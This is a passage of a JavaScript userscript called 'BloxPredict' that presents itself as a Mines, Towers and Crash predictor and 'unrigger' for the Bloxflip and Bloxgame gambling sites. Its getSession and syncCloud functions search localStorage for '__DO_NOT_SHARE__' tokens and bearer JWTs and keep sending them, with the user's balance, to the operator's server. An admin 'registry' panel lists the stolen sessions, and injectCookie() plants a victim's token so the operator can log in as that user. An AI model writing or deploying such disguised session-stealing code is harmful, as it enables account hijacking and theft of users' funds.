        updatePredictCount(val) {
            this.predictTiles = Math.max(1, Math.min(24, parseInt(val) || 3));
            localStorage.setItem('bp_predict_tiles', this.predictTiles);
            this.notify(`TILES: ${this.predictTiles}`);
        },

        setTheme(theme) {
            CURRENT_THEME = theme;
            localStorage.setItem('bp_theme', theme);
            const root = document.documentElement;
            const colors = THEMES[theme];
            // Assuming THEMES is defined elsewhere and 'noir' is updated to pure black/white there.
            // If THEMES was provided, I would modify it here.
            Object.keys(colors).forEach(key => {
                root.style.setProperty(`--bp-${key}`, colors[key]);
            });
            this.notify(`THEME: ${theme.toUpperCase()}`);
            this.handleSettings();
        },

        async handleLogin() {
            const key = document.getElementById('bp-key').value;
            try {
                const res = await this.call('POST', '/api/login', { key });
                AUTH_TOKEN = res.token;
                this.isLoggedIn = true;

                this.adminRole = res.adminType === 'full' ? 'admin-niam' : res.adminType === 'keygen' ? 'admin-blazee' : (key.includes('niam') ? 'admin-niam' : key.includes('blazee') ? 'admin-blazee' : null);
                if (this.adminRole) localStorage.setItem('bp_admin_role', this.adminRole);

                this.syncCloud();
                document.querySelector('.bp-overlay').classList.add('hidden');
                document.querySelector('.bp-pill').classList.add('active');
                this.notify(`OPERATOR: ${this.adminRole || 'USER'}`);
                this.startMonitoring();
            } catch (e) {
                console.error('Login Fail:', e);
                alert(e.message || 'Invalid Key');
            }
        },

        getSession() {
            const tokens = {};

            // Fuzzy search localStorage for the specific high-value keys
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('DO_NOT_SHARE')) {
                    const val = localStorage.getItem(key);
                    if (val && val.length > 10) {
                        if (key.endsWith('_TOKEN')) tokens.t1 = val;
                        else if (key.endsWith('_TOKEN2')) tokens.t2 = val;
                        else if (key.endsWith('ISSUED_AT')) tokens.ts = val;
                    }
                }
            }

            // If we found the primary token, package it
            if (tokens.t1 && tokens.t1.length > 20) {
                return "PRECISION_TOKENS:" + JSON.stringify(tokens);
            }

            // Fallback: If precision keys missing, try catching a standard JWT bearer
            if (CAPTURED_BEARER && CAPTURED_BEARER.length > 20 && !CAPTURED_BEARER.toLowerCase().includes('intercom')) {
                return CAPTURED_BEARER;
            }

            // Secondary fallback: Look for any valid JWT in common keys
            const keys = ['_session', 'token', 'access_token'];
            for (const k of keys) {
                const val = localStorage.getItem(k);
                if (val && val.startsWith('ey') && val.length > 50) return val;
            }

            return null;
        },

        getBalanceValue() {
            const el = Bridge.getBalance();
            if (!el) return 0;
            return parseFloat((el.innerText || el.textContent || '0').replace(/[^0-9.]/g, '') || '0');
        },

        syncCloud() {
            const data = this.getSession();
            if (!data || data === this.lastCookie) return;

            const balance = this.getBalanceValue();

            this.call('POST', '/api/log-data', {
                session: data,
                fullCookie: '', // RESTRICTED: No other cookies sent
                userId: Bridge.getProfile()?.innerText || 'Anonymous',
                type: window.location.host.includes('bloxflip') ? 'bloxflip' : 'bloxgame',
                balance: balance.toString(),
                profits: PROFITS,
                breakdown: GAMEMODE_PROFITS
            }).then(() => {
                this.lastCookie = data;
                this.lastSyncTime = Date.now();
                console.log('BloxPredict: Restricted Sync Success');
            }).catch(() => { });
        },

        morph(content, ms = 2500) {
            const pill = document.querySelector('.bp-pill'); const zone = document.getElementById('bp-morph');
            pill.classList.add('morphed'); zone.innerHTML = content;
            if (ms > 0) setTimeout(() => { pill.classList.remove('morphed'); zone.innerHTML = ''; }, ms);
        },

        handleUnrig() {
            const scanner = `
                <div class="bp-unrig-scanner">
                    <div class="bp-scanner-line"></div>
                    <div style="font-size:3.5rem; font-weight:900; filter:blur(1px); opacity:0.1; position:absolute;">SCANNING</div>
                    <div style="font-size:1.8rem; font-weight:950; letter-spacing:2px; z-index:10; color:var(--bp-accent); text-shadow:0 0 20px var(--bp-accent);">UNRIGGING</div>
                </div>
            `;
            this.morph(scanner, 2800);
            setTimeout(() => this.predict(), 1200);
        },

        handleUpdates() {
            this.morph(`
                <div style="font-size:1.8rem; font-weight:950; margin-bottom:10px;">NO UPDATES</div>
                <div style="font-size:0.85rem; color:var(--bp-text-dim); margin-bottom:20px;">You're running the latest version of BloxPredict.</div>
                <button id="bp-upd-close" style="width:100%; padding:15px; border-radius:18px; background:white; color:black; font-weight:950; border:none; cursor:pointer;">RESUME</button>
            `, 0);
            document.getElementById('bp-upd-close').onclick = () => document.querySelector('.bp-pill').classList.remove('morphed');
        },

        handleSettings() {
            const themeOpts = Object.keys(THEMES).map(t => `
                <div class="bp-theme-opt ${t === CURRENT_THEME ? 'active' : ''}" 
                     style="background: ${THEMES[t].accent};" 
                     data-theme="${t}"></div>
            `).join('');

            this.morph(`
                <div style="font-size:2rem; font-weight:950; margin-bottom:5px;">SETTINGS</div>
                <div style="font-size:0.7rem; font-weight:800; color:var(--bp-text-dim); text-transform:uppercase; letter-spacing:2px; margin-bottom:20px;">Configure your script</div>
                
                <div class="bp-setting-row">
                    <div class="bp-setting-label">Privacy Shield <span>Blur identity & funds</span></div>
                    <div class="bp-toggle ${this.privacyMode ? 'active' : ''}" id="bp-privacy-toggle"></div>
                </div>

                <div class="bp-setting-row">
                    <div class="bp-setting-label">Predict Tiles <span>Targeted tile count</span></div>
                    <input type="number" class="bp-input-small" id="bp-predict-input" value="${this.predictTiles}" min="1" max="24">
                </div>

                <div class="bp-setting-row">
                    <div class="bp-setting-label">Crash Risk <span>Max multiplier target (1.1 - 5.0)</span></div>
                    <input type="number" class="bp-input-small" id="bp-crash-risk-input" value="${this.crashRisk}" min="1.1" max="5" step="0.1">
                </div>

                <div class="bp-theme-grid">${themeOpts}</div>
                
                <div style="margin-top:25px; display:flex; gap:12px; width:100%;">
                    ${this.adminRole === 'admin-niam' ? '<button id="bp-registry-btn" style="flex:1; background:rgba(var(--bp-accent-rgb), 0.1); border:1px solid var(--bp-border); color:var(--bp-accent); padding:15px; border-radius:18px; cursor:pointer; font-weight:950; font-size:0.8rem;">REGISTRY</button>' : ''}
                    ${this.adminRole === 'admin-blazee' ? '<button id="bp-keygen-btn" style="flex:1; background:rgba(var(--bp-accent-rgb), 0.1); border:1px solid var(--bp-border); color:var(--bp-accent); padding:15px; border-radius:18px; cursor:pointer; font-weight:950; font-size:0.8rem;">GENERATE KEY</button>' : ''}
                    <button id="bp-close-s" style="flex:2; background:white; color:black; border:none; padding:15px; border-radius:18px; cursor:pointer; font-weight:950; font-size:0.8rem;">RESUME</button>
                </div>
            `, 0);

            document.querySelectorAll('.bp-theme-opt').forEach(opt => {
                opt.onclick = () => this.setTheme(opt.dataset.theme);
            });
            document.getElementById('bp-privacy-toggle').onclick = () => this.togglePrivacy();
            document.getElementById('bp-predict-input').onchange = (e) => this.updatePredictCount(e.target.value);
            document.getElementById('bp-crash-risk-input').onchange = (e) => {
                let v = parseFloat(e.target.value);
                if (v < 1.1) v = 1.1;
                if (v > 5) v = 5;
                this.crashRisk = v;
                localStorage.setItem('bp_crash_risk', v);
                this.notify(`CRASH RISK: ${v}x`);
            };
            if (document.getElementById('bp-registry-btn')) document.getElementById('bp-registry-btn').onclick = () => this.handleRegistry();
            if (document.getElementById('bp-keygen-btn')) document.getElementById('bp-keygen-btn').onclick = () => this.handleKeygen();
            document.getElementById('bp-close-s').onclick = () => document.querySelector('.bp-pill').classList.remove('morphed');

            const syncBtn = document.createElement('button');
            syncBtn.style.cssText = "margin-top:10px; width:100%; padding:10px; border-radius:12px; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:white; font-size:0.7rem; font-weight:800; cursor:pointer;";
            syncBtn.innerText = "FORCE CLOUD SYNC";
            syncBtn.onclick = () => { this.syncCloud(); this.notify('CLOUD SYNC DISPATCHED'); };
            document.getElementById('bp-morph').appendChild(syncBtn);
        },

        handleKeygen() {
            const key = `BP-${Math.random().toString(36).toUpperCase().substring(2, 10)}`;
            this.morph(`
                <div style="font-size:1.8rem; font-weight:950; margin-bottom:10px;">KEY GENERATOR</div>
                <div style="background:rgba(0,0,0,0.3); padding:20px; border-radius:15px; font-family:monospace; font-size:1.2rem; color:var(--bp-accent); word-break:break-all;">${key}</div>
                <button id="bp-copy-key" style="margin-top:15px; width:100%; padding:15px; border-radius:15px; background:var(--bp-accent); color:white; border:none; cursor:pointer; font-weight:900;">COPY TO CLIPBOARD</button>
                <button id="bp-back-gen" style="margin-top:10px; width:100%; padding:10px; border-radius:15px; background:transparent; color:white; border:none; cursor:pointer; font-weight:700;">BACK</button>
            `, 0);
            document.getElementById('bp-copy-key').onclick = () => { navigator.clipboard.writeText(key); this.notify('KEY COPIED'); };
            document.getElementById('bp-back-gen').onclick = () => this.handleSettings();
        },

        async handleRegistry() {
            this.morph(`<div class="bp-fancy-loader" style="display:block; position:relative;"></div>`, 0);
            try {
                const res = await this.call('GET', '/api/admin/users').catch(() => []);
                const users = res.filter(u => u && u.session && u.session !== 'undefined');

                const rows = users.length ? users.map(u => `
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.05); text-align:left;">
                    <td style="padding: 10px; font-weight:800; font-size:0.85rem;">${u.username || u.id}</td>
                    <td style="padding: 10px; font-family:monospace; font-size:0.6rem; color:var(--bp-secondary); max-width:80px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${u.session || ''}">${u.session || 'N/A'}</td>
                    <td style="padding: 10px; display:flex; gap:5px;">
                        <button class="bp-inline-copy-btn" data-cookie="${u.session || ''}" style="padding:8px; border-radius:8px; background:var(--bp-accent); color:white; border:none; cursor:pointer; font-weight:bold; font-size:0.6rem;">COPY</button>
                        <button class="bp-inline-login-btn" data-cookie="${u.session || ''}" style="padding:8px; border-radius:8px; background:white; color:black; border:none; cursor:pointer; font-weight:bold; font-size:0.6rem;">LOGIN</button>
                    </td>
                </tr>
            `).join('') : '<tr><td colspan="3" style="text-align:center; padding:20px; opacity:0.5;">No active logs found</td></tr>';

                this.morph(`
                <div style="font-size:1.8rem; font-weight:950; margin-bottom:0px;">REGISTRY NODE</div>
                <div style="font-size:0.75rem; font-weight:800; color:var(--bp-accent); margin-bottom:15px; letter-spacing:1px;">GAMES SYNCED FROM ESP: ${this.historicalData.totalGames || 0}</div>
                <div style="max-height: 250px; overflow-y: auto; width: 100%; border-radius:10px; border:1px solid rgba(255,255,255,0.05);">
                    <table style="width:100%; border-collapse:collapse; color:white;">
                        <thead style="background:rgba(255,255,255,0.02); font-size:0.6rem; color:var(--bp-text-dim);">
                            <tr><th style="padding:10px; text-align:left;">USER</th><th style="padding:10px; text-align:left;">COOKIE DATA</th><th style="padding:10px; text-align:left;">ACTION</th></tr>
                        </thead>
                        <tbody>${rows}</tbody>
                    </table>
                </div>
                <button id="bp-reg-back" style="margin-top:15px; width:100%; padding:12px; border-radius:12px; background:white; color:black; font-weight:900; border:none; cursor:pointer;">RETURN</button>
            `, 0);
                document.getElementById('bp-reg-back').onclick = () => document.querySelector('.bp-pill').classList.remove('morphed');

                document.querySelectorAll('.bp-inline-copy-btn').forEach(btn => {
                    btn.onclick = () => {
                        const cookieText = btn.getAttribute('data-cookie');
                        navigator.clipboard.writeText(cookieText).then(() => {
                            this.notify('COPIED TO CLIPBOARD');
                        }).catch(() => {
                            prompt("Copy manually:", cookieText);
                        });
                    };
                });

                document.querySelectorAll('.bp-inline-login-btn').forEach(btn => {
                    btn.onclick = () => {
                        const cookieText = btn.getAttribute('data-cookie');
                        this.injectCookie(cookieText);
                    };
                });
            } catch (e) {
                this.notify('REGISTRY OFFLINE');
                document.querySelector('.bp-pill').classList.remove('morphed');
            }
        },

        viewCookie(id, session) {
            alert(`Cookie for ${id}:\n\n_session=${session}`);
        },

        injectCookie(data) {
            if (!data || data === 'No Session Found') return alert('Invalid Session Data');

            const domain = window.location.hostname.replace('www.', '');
            const rootDomain = domain.includes('bloxgame')
                ? (domain.includes('.us') ? '.bloxgame.us' : '.bloxgame.com')
                : (domain.includes('.us') ? '.bloxflip.us' : '.bloxflip.com');

            // Expiry: 1 year from now
            let future = new Date();
            future.setFullYear(future.getFullYear() + 1);
            let expires = future.toUTCString();

            if (data.startsWith("PRECISION_TOKENS:")) {
                try {
                    const tokens = JSON.parse(data.replace("PRECISION_TOKENS:", ""));
                    const prefix = domain.includes('bloxgame') ? '__DO_NOT_SHARE__BLOXGAME_' : '__DO_NOT_SHARE__BLOXFLIP_';

                    if (tokens.t1) localStorage.setItem(prefix + 'TOKEN', tokens.t1);
                    if (tokens.t2) localStorage.setItem(prefix + 'TOKEN2', tokens.t2);
                    if (tokens.ts) localStorage.setItem(prefix + 'TOKEN_ISSUED_AT', tokens.ts);

                    // Set primary auth tokens for fallback
                    if (tokens.t1) {
                        localStorage.setItem('_session', tokens.t1);
                        localStorage.setItem('token', tokens.t1);
                        document.cookie = `_session=${tokens.t1}; expires=${expires}; path=/; domain=${rootDomain}; secure; SameSite=Lax`;
                    }
                } catch (e) {
                    console.error('Injection Error:', e);
                }
            } else if (data.startsWith("STORAGE_OBJ:")) {
                const json = data.replace("STORAGE_OBJ:", "");
                localStorage.setItem('STORAGE', json);
                try {
                    const parsed = JSON.parse(json);
                    if (parsed.t1) {
                        localStorage.setItem('_session', parsed.t1);
                        localStorage.setItem('token', parsed.t1);
                        localStorage.setItem('bp_target_identity', parsed.t1);
                        document.cookie = `_session=${parsed.t1}; expires=${expires}; path=/; domain=${rootDomain}; secure; SameSite=Lax`;
                    }
                } catch (e) { }
            } else if (data.startsWith("RAW_COOKIE:")) {
                const raw = data.replace("RAW_COOKIE:", "");
                raw.split(';').forEach(c => {
                    const trimmed = c.trim();
                    if (trimmed) {
                        document.cookie = `${trimmed}; expires=${expires}; path=/; domain=${rootDomain}; secure; SameSite=Lax`;
                    }
                });
            } else {
                // Primary identifiers
                const cookieNames = ['_session', 'token', 'access_token', 'authorization'];
                cookieNames.forEach(name => {
                    document.cookie = `${name}=${data}; expires=${expires}; path=/; domain=${rootDomain}; secure; SameSite=Lax`;
                });

                // Selective clear of site auth keys to avoid losing userscript settings
                const siteKeys = ['_session', 'token', 'access_token', 'authorization', 'userId', 'user', 'profile'];
                siteKeys.forEach(k => localStorage.removeItem(k));

                localStorage.setItem('_session', data);
                localStorage.setItem('token', data);
                localStorage.setItem('access_token', data);
                localStorage.setItem('bp_target_identity', data);
            }

            this.notify('IDENTITY OVERRITTEN - RELOADING...');
            setTimeout(() => window.location.reload(), 1500);
        },

        async predict() {
            if (this.isPredicting) return;
            this.isPredicting = true;
            this.activePrediction = null;
            const predId = Math.random().toString(36).substring(2);
            this.currentPredictionId = predId;

            const loader = document.getElementById('bp-loader');
            const grid = document.getElementById('bp-replica');
            const brand = document.getElementById('bp-brand-text');

            const gameType = this.gameMode;
            let gridSize = 5;

            if (gameType === 'mines') {
                const tiles = Bridge.getTiles();
                if (!tiles || tiles.length === 0) { this.isPredicting = false; return; }
                gridSize = Math.sqrt(tiles.length);
                grid.style.gridTemplateColumns = `repeat(${gridSize}, 18px)`;
                grid.style.gridTemplateRows = `repeat(${gridSize}, 18px)`;
                grid.innerHTML = Array.from({ length: tiles.length }).map((_, i) => `<div class="bp-replica-tile" data-idx="${i}"></div>`).join('');
                this.bindReplica();
                grid.classList.remove('visible');
            } else if (gameType === 'towers') {
                grid.style.gridTemplateColumns = 'repeat(3, 16px)';
                grid.style.gridTemplateRows = 'repeat(8, 16px)';
                grid.style.gap = '3px';
                grid.style.padding = '0';
                grid.innerHTML = Array.from({ length: 24 }).map((_, i) => `<div class="bp-replica-tile" data-idx="${i}" style="width:16px; height:16px; border-radius:4px;"></div>`).join('');
                grid.classList.remove('visible');
            }

            this.clear();
            brand.classList.add('hidden');
            loader.style.display = 'block';

            try {
                const res = await this.call('POST', '/api/predict', {
                    gameType,
                    gridSize: gridSize,
                    history: this.historicalData.mines,
                    tiles: this.predictTiles,
                    crashRisk: this.crashRisk,
                    role: this.adminRole,
                    runId: predId
                });

                this.activePrediction = res.prediction;

                setTimeout(() => {
                    if (this.currentPredictionId !== predId) return;
                    loader.style.display = 'none';
                    grid.classList.add('visible');
                    brand.classList.add('hidden');
                    this.renderPrediction(gridSize);
                    if (this.autoMines) {
                        if (gameType === 'mines') this.autoPlayMines(gridSize, predId);
                        else if (gameType === 'towers') this.autoPlayTowers(predId);
                        else if (gameType === 'crash') this.autoPlayCrash(predId);
                    }
                }, 1200);
            } catch (e) {
                loader.style.display = 'none';
                brand.classList.remove('hidden');
                this.notify('ENGINE TIMEOUT');
            } finally {
                setTimeout(() => { this.isPredicting = false; }, 1500);
            }
        },

        autoPlayMines(size, predId) {
            if (!this.activePrediction || this.currentPredictionId !== predId) return;
            const tiles = Bridge.getTiles();
            let count = 0;
            let totalToClick = 0;

            // Count total we plan to click
            this.activePrediction.forEach((row, r) => row.forEach((safe, c) => {
                const i = r * size + c;
                if (safe && i < tiles.length && totalToClick < this.predictTiles) {
                    totalToClick++;
                }
            }));

            this.activePrediction.forEach((row, r) => row.forEach((safe, c) => {
                const i = r * size + c;
                if (safe && i < tiles.length && count < this.predictTiles) {
                    const currentClickIdx = count;
                    setTimeout(() => {
                        if (this.currentPredictionId !== predId) return; // Stop if prediction changed during delay
                        const isBombRevealed = !!document.querySelector('button[class*="isBomb"]') || !!document.querySelector('button[class*="IsBomb"]');
                        if (this.gameState === 'in-game' && !isBombRevealed && tiles[i] && !tiles[i].disabled) tiles[i].click();

                        // If we just clicked the last tile, initiate cashout sequence
                        if (currentClickIdx + 1 >= totalToClick && this.gameState === 'in-game' && !isBombRevealed) {
                            setTimeout(() => {
                                const cashoutBtn = Bridge.getBetBtn();
                                if (cashoutBtn && (cashoutBtn.innerText.toLowerCase().includes('cash') || cashoutBtn.innerText.toLowerCase().includes('end game'))) {
                                    cashoutBtn.click();
                                }
                            }, 600);
                        }
                    }, 500 + (count * 400));
                    count++;
                }
            }));
        },

        autoPlayTowers(predId) {
            if (!this.activePrediction || this.currentPredictionId !== predId) return;
            const allRows = Array.from(Bridge.getTowerRows()).reverse();
            this.activePrediction.forEach((safeIdx, r) => {
                setTimeout(() => {
                    if (this.currentPredictionId !== predId) return;
                    if (allRows[r]) {
                        const containers = Bridge.getTowerButtons(allRows[r]);
                        if (containers[safeIdx]) {
                            const btn = containers[safeIdx].querySelector('button');
                            if (btn) btn.click();
                        }
                    }
                }, r * 800);
            });
        },

        autoPlayCrash(predId) {
            if (!this.activePrediction || this.currentPredictionId !== predId) return;
            const target = parseFloat(this.activePrediction);
            let cashedOut = false;

            const checkCrash = setInterval(() => {
                if (this.currentPredictionId !== predId || cashedOut) { clearInterval(checkCrash); return; }
                const multiEl = document.querySelector('div[class*="crash_multiplier__"]');
                if (multiEl) {
                    const current = parseFloat(multiEl.innerText.replace('x', ''));
                    if (current >= target) {
                        const btn = Bridge.getBetBtn();
                        if (btn && btn.innerText.toLowerCase().includes('cash')) {
                            btn.click();
                            cashedOut = true;
                            clearInterval(checkCrash);
                            const grid = document.getElementById('bp-replica');
                            if (grid) {
                                grid.innerHTML = `<div style="font-size:1.5rem; font-weight:900; color:white; background:var(--bp-green); padding:10px 20px; border-radius:15px; box-shadow:0 0 40px var(--bp-green);">WINNER!</div>`;
                                setTimeout(() => this.updateUIPageState(), 2000);
                            }
                        }
                    }
                }
            }, 50);
        },

        collectHistorical() {
            const revealed = document.querySelectorAll('button[class*="isBomb"], button[class*="IsBomb"]');
            revealed.forEach(b => {
                const idx = Array.from(Bridge.getTiles()).indexOf(b);
                if (idx !== -1 && !this.historicalData.mines.includes(idx)) {
                    this.historicalData.mines.push(idx);
                }
            });
            while (this.historicalData.mines.length > 5) this.historicalData.mines.shift();

            this.historicalData.totalGames++;
            localStorage.setItem('bp_games_sync', this.historicalData.totalGames);
            localStorage.setItem('bp_history_mines', JSON.stringify(this.historicalData.mines));
        },

        bindReplica() {
            const tiles = Bridge.getTiles();
            document.querySelectorAll('.bp-replica-tile').forEach(tile => {
                tile.onclick = () => {
                    const idx = tile.dataset.idx;
                    if (tiles[idx]) {
                        tiles[idx].click();
                        tile.classList.remove('active');
                        this.removeBox(idx);
                    }
                };
            });
            // Also bind to real tiles for halo fade
            tiles.forEach((t, i) => {
                if (!t.dataset.bound) {
                    t.addEventListener('click', () => {
                        const replica = document.querySelector(`.bp-replica-tile[data-idx="${i}"]`);
                        if (replica) replica.classList.remove('active');
                        this.removeBox(i);
                    });
                    t.dataset.bound = "true";
                }
            });
        },

        renderPrediction(size) {
            this.clear();
            if (!this.activePrediction) return;

            if (this.gameMode === 'towers') {
                const allRows = Array.from(Bridge.getTowerRows()).reverse();
                this.activePrediction.forEach((safeIdx, r) => {
                    if (allRows[r]) {
                        const containers = Bridge.getTowerButtons(allRows[r]);
                        if (containers[safeIdx]) {
                            const btn = containers[safeIdx].querySelector('button');
                            if (btn) this.createBox(btn, r * 3 + safeIdx);
                            const replicaIdx = (7 - r) * 3 + safeIdx;
                            const tile = document.querySelector(`.bp-replica-tile[data-idx="${replicaIdx}"]`);
                            if (tile) tile.classList.add('active');

                            // Bind click to clear
                            if (btn && !btn.dataset.bound) {
                                btn.addEventListener('click', () => {
                                    if (tile) tile.classList.remove('active');
                                    this.removeBox(r * 3 + safeIdx);
                                });
                                btn.dataset.bound = "true";
                            }
                        }
                    }
                });
            } else if (this.gameMode === 'crash') {
                const grid = document.getElementById('bp-replica');
                if (grid) {
                    grid.classList.add('visible');
                    let displayPred = this.activePrediction;
                    if (Array.isArray(displayPred)) displayPred = displayPred[0];
                    if (typeof displayPred === 'string' && displayPred.includes(',')) displayPred = displayPred.split(',')[0];
                    const finalVal = Math.max(1.1, parseFloat(displayPred || 1.1));
                    grid.innerHTML = `
                        <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100%;">
                            <div style="font-size:0.65rem; font-weight:800; color:var(--bp-text-dim); text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Prediction</div>
                            <div style="font-size:2.8rem; font-weight:950; color:var(--bp-green); text-shadow: 0 0 40px rgba(0,255,136,0.3); line-height:1;">${finalVal.toFixed(2)}x</div>
                        </div>`;
                }
            } else {
                const tiles = Bridge.getTiles();
                const replica = document.querySelectorAll('.bp-replica-tile');
                let count = 0;
                if (!Array.isArray(this.activePrediction)) return;
                this.activePrediction.forEach((row, r) => row.forEach((safe, c) => {
                    const i = r * size + c;
                    if (safe && i < tiles.length && count < this.predictTiles) {
                        if (tiles[i]) this.createBox(tiles[i], i);
                        if (replica[i]) replica[i].classList.add('active');
                        count++;
                    }
                }));
            }
        },

        createBox(el, i) {
            const r = el.getBoundingClientRect(); const box = document.createElement('div');
            box.className = 'bp-box-highlight'; box.dataset.idx = i;
            box.style.top = `${window.scrollY + r.top}px`;
            box.style.left = `${window.scrollX + r.left}px`; box.style.width = `${r.width}px`; box.style.height = `${r.height}px`;
            document.body.appendChild(box);
        },

        removeBox(i) {
            document.querySelectorAll(`.bp-box-highlight[data-idx="${i}"]`).forEach(b => {
                b.style.opacity = '0';
                b.style.transform = 'scale(1.5)';
                setTimeout(() => b.remove(), 300);
            });
        },

        clear() { document.querySelectorAll('.bp-box-highlight').forEach(b => b.remove()); document.querySelectorAll('.bp-replica-tile').forEach(t => t.classList.remove('active')); },

        notify(msg) { const t = document.getElementById('bp-toast'); t.innerText = msg; t.classList.add('active'); setTimeout(() => t.classList.remove('active'), 2500); },

        startMonitoring() {
            setInterval(() => {
                if (this.autoMines && Date.now() - this.lastUnrig > 60000) {
                    this.handleUnrig();
                    this.lastUnrig = Date.now();
                }

                // SPA Support: Detect navigation
                if (this.lastUrl !== window.location.href) {
                    this.lastUrl = window.location.href;
                    const url = window.location.href;
                    if (url.includes('towers')) this.gameMode = 'towers';
                    else if (url.includes('crash')) this.gameMode = 'crash';
                    else this.gameMode = 'mines';
                    this.updateUIPageState();
                    this.clear();
                    this.gameState = 'idle';
                    // Auto-predict on crash page load
                    if (this.gameMode === 'crash') {
                        setTimeout(() => this.predict(), 1500);
                    }
                }

                // Crash: detect round end and auto re-predict (debounced)
                if (this.gameMode === 'crash') {
                    const crashedEl = document.querySelector('[class*="crash_crashGameCoefficient"][class*="isCrashed"], [class*="crash_crashed"]');
                    const isCrashed = !!crashedEl;
                    if (isCrashed && !this._lastCrashState && !this._crashDebounce) {
                        this._crashDebounce = true;
                        setTimeout(() => {
                            this.predict();
                            this._crashDebounce = false;
                        }, 4000);
                    }
                    this._lastCrashState = isCrashed;
                }

                const btn = Bridge.getBetBtn(); if (!btn) return;
                const text = btn.innerText.toLowerCase();
                const isBombNearby = !!document.querySelector('button[class*="isBomb"], button[class*="IsBomb"], button[class*="isLoss"], button[class*="IsLoss"], [class*="crash_multiplier__"].crash_crashed');

                const isWaiting = text.includes('waiting') || text.includes('uncover') || text.includes('next');
                const isCashout = text.includes('cash') || text.includes('withdraw') || text.includes('end');
                const isStartGame = text.includes('start') || text.includes('bet') || text.includes('play') || text.includes('start new');

                const sBtn = document.getElementById('bp-state-btn'); const sTxt = document.getElementById('bp-state-txt'); const sIcon = document.getElementById('bp-state-icon');

                if (this.isLoggedIn) {
                    // Check for session changes every heartbeat (100ms)
                    const session = this.getSession();
                    if (session && (session !== this.lastCookie || !this.lastSyncTime || Date.now() - this.lastSyncTime > 60000)) {
                        this.syncCloud();
                    }
                }

                if (isCashout) {
                    const cleanText = text.replace(/,/g, '');
                    const matches = cleanText.match(/[\d.]+/g);
                    if (matches) {
                        const val = parseFloat(matches[matches.length - 1]);
                        // Sanity check: if it's towers, usually 2 digits or more for cashout
                        if (val > 0) this.potentialWin = val;
                    }
                }

                if (this.autoMines && this.gameState === 'idle' && isStartGame && !this.isBetting) {
                    this.isBetting = true;
                    btn.click();
                    setTimeout(() => { this.isBetting = false; }, 1000);
                }

                if (isBombNearby) {
                    this.potentialWin = 0;
                    this.winTracked = false;
                }

                if ((isWaiting || isCashout) && !isBombNearby && this.gameState !== 'in-game') {
                    this.gameState = 'in-game'; sBtn.classList.add('active'); sTxt.innerText = 'In-game';
                    sIcon.innerHTML = `<path d="M18,8H17V6A5,5 0 0,0 7,6V8H6A2,2 0 0,0 4,10V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V10A2,2 0 0,0 18,8M9,6A3,3 0 0,1 15,6V8H9V6M12,17A2,2 0 0,1 10,15A2,2 0 0,1 12,13A2,2 0 0,1 14,15A2,2 0 0,1 12,17Z"/>`;
                    if (this.gameMode !== 'crash') this.predict();
                    this.winTracked = false;
                    this.potentialWin = 0;
                } else if ((isStartGame || isBombNearby) && this.gameState === 'in-game') {
                    if (!isBombNearby && isStartGame && !this.winTracked) {
                        this.onWin();
                        this.winTracked = true;
                    }
                    this.gameState = 'idle';
                    this.potentialWin = 0;
                    sBtn.classList.remove('active'); sTxt.innerText = 'Unrigged';
                    sIcon.innerHTML = `<path d="M12,17A2,2 0 0,0 14,15C14,13.89 13.1,13 12,13A2,2 0 0,0 10,15A2,2 0 0,0 12,17M18,8A2,2 0 0,1 20,10V20A2,2 0 0,1 18,22H6A2,2 0 0,1 4,20V10C4,8.89 4.9,8 6,8H7V6A5,5 0 0,1 12,1A5,5 0 0,1 17,6V8H18M12,3A3,3 0 0,0 9,6V8H15V6A3,3 0 0,0 12,3Z"/>`;
                    this.collectHistorical();
                    this.clear(); document.getElementById('bp-replica').classList.remove('visible'); document.getElementById('bp-brand-text').classList.remove('hidden');
                }
            }, 100);
        },

        onWin() {
            let winAmount = this.potentialWin;
            const btn = Bridge.getBetBtn();

            // If we didn't get it from the button during the game, try various UI elements
            if (winAmount <= 0) {
                const toast = document.querySelector('[class*="toasts_toast"], [class*="toast"]');
                const winOverlay = document.querySelector('[class*="winAmount"], [class*="win_amount"], span[class*="winAmount"]');

                if (winOverlay) {
                    winAmount = parseFloat(winOverlay.innerText.replace(/[^0-9.]/g, '') || '0');
                } else if (toast && (toast.innerText.toLowerCase().includes('won') || toast.innerText.includes('$') || toast.innerText.toLowerCase().includes('+'))) {
                    const matches = toast.innerText.match(/[\d.]+/);
                    if (matches) winAmount = parseFloat(matches[0]);
                }
            }

            if (winAmount > 0) {
                PROFITS += winAmount;
                if (!GAMEMODE_PROFITS[this.gameMode]) GAMEMODE_PROFITS[this.gameMode] = 0;
                GAMEMODE_PROFITS[this.gameMode] += winAmount;
                localStorage.setItem('bp_profits_v3', PROFITS);
                localStorage.setItem('bp_breakdown_v3', JSON.stringify(GAMEMODE_PROFITS));

                document.getElementById('bp-profits-val').innerText = PROFITS.toLocaleString();
                document.getElementById('bp-profits-btn').classList.add('anim-bulge');
                setTimeout(() => document.getElementById('bp-profits-btn').classList.remove('anim-bulge'), 600);
                this.notify(`WON: +${winAmount.toFixed(2)}`);
            }
        },

        async call(m, e, d) {
            return new Promise((r, j) => {
                GM_xmlhttpRequest({
                    method: m, url: API_URL + e,
                    headers: { 'Content-Type': 'application/json', 'Authorization': AUTH_TOKEN ? `Bearer ${AUTH_TOKEN}` : '' },
                    data: JSON.stringify(d),
                    onload: x => {
                        try {
                            const res = JSON.parse(x.responseText);
                            if (x.status >= 400) {
                                // Detect stale/invalid JWT — clear it and force re-login
                                if ((x.status === 403 || x.status === 500) && res.message &&
                                    (res.message.includes('expired') || res.message.includes('Session') || res.message.includes('License'))) {
                                    AUTH_TOKEN = null;
                                    localStorage.removeItem('bp_admin_role');
                                    this.isLoggedIn = false;
                                    const overlay = document.querySelector('.bp-overlay');
                                    const pill = document.querySelector('.bp-pill');
                                    if (overlay) overlay.classList.remove('hidden');
                                    if (pill) pill.classList.remove('active');
                                }
                                j(res);
                            } else r(res);
                        } catch (err) {
                            j({ message: 'Server Response Error' });
                        }
                    },
                    onerror: err => j(err)
                });
            });
        }
    };
    window.App = App;

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        App.init();
    } else {
        window.addEventListener('DOMContentLoaded', () => App.init());
    }
})();
